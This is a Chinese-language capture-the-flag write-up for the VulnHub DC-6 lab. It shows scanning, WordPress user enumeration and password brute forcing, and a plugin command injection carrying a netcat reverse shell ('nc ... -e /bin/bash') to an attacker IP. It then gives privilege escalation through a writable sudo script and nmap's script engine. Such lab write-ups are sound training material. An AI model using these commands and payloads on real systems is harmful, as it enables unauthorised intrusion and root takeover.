# DC: 6

2024-5-17 https://vulnhub.com/entry/dc-6,315/

difficulty: Intermediate

## IP

192.168.5.27

## Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 3e52cece01b694eb7b037dbe087f5ffd (RSA)
|   256 3c836571dd73d723f8830de346bcb56f (ECDSA)
|_  256 41899e85ae305be08fa4687106b415ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
```

开放 2 个端口，根据靶场描述，需要将特定域名添加到 hosts 文件中：192.168.5.27 wordy

访问 http://wordy/ 看看有什么内容，是一个 WordPress 网站，按照往常惯例，应该是需要找到登陆 wp 后台的用户名和密码，先扫描下目录，查看是否有隐藏的目录信息。

```
gobuster dir -u http://wordy/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip
```

但是发现的都是一些 wp 的默认页面。

使用 wpscan 搜集下用户名：

```
wpscan --url http://wordy/ -e u
```

发现：admin、mark、graham、sarah、jens

根据靶场描述，提示了我们使用的密码字典信息：cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt

使用得到的用户名和密码进行爆破：

```
wpscan --url http://wordy/ -t 20 -U users.txt -P passwords.txt
```

得到登陆 wp 后的用户凭证：Username: mark, Password: helpdesk01

使用得到的用户凭据，登陆 wp 后台管理页面，但是这个用户的权限很低，没有修改后台 php 页面的权限。

发现左侧功能菜单中有一个 Activity monitor 功能，看看这个功能上是否有一些漏洞可以利用，找到了https://www.exploit-db.com/exploits/45274 RCE 执行：

http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools 在执行 Lookup 时可以带入自己的命令，在 bp 中使用 repeater 进行 exp 构造，在输入字段中输入以下内容。

```
baidu.com;nc 192.168.5.10 8888 -e /bin/bash
```

在 kali 上监听 8888 端口，然后访问上面页面，得到反弹 shell。

查看/home 文件夹中的内容：

```
www-data@dc-6:/home$ ls -aR
.:
.  ..  graham  jens  mark  sarah

./graham:
.  ..  .bash_history  .bash_logout  .bashrc  .profile

./jens:
.  ..  .bash_history  .bash_logout  .bashrc  .profile  backups.sh

./mark:
.  ..  .bash_history  .bash_logout  .bashrc  .profile  stuff

./mark/stuff:
.  ..  things-to-do.txt

./sarah:
.  ..  .bash_logout  .bashrc  .profile
```

看样子 mark 和 jens 用户可能有提权点，看看 /home/mark/stuff/things-to-do.txt 有什么提示。

```
www-data@dc-6:/home$ cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

根据提示可以知道系统添加了一个用户 graham:GSo7isUM1D4，尝试 su 切换到该用户，切换成功。

提示我们 Jens 有备份，查看下内容：

```
www-data@dc-6:/home/jens$ cat backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
```

应该是可以以某种权限调用这个脚本，找到这个脚本的执行点。

```
graham@dc-6:/etc/cron.d$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

提示以 jens 用户执行脚本，同时，我们能够修改 backup.sh 脚本：

```
graham@dc-6:/tmp$ ls -al /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
graham@dc-6:/tmp$ id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)

echo '/bin/bash' > /home/jens/backups.sh
```

用户 graham 执行：

```
sudo -u jens /home/jens/backups.sh

jens@dc-6:/tmp$ id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
```

得到了 jens 的用户权限，继续查找提权点，看是否能到 root 权限。

```
jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

构造 exp:

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

最终得到 root 权限：

```
# uid=0(root) gid=0(root) groups=0(root)

# cat /root/theflag.txt

#

Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"'
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8)


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
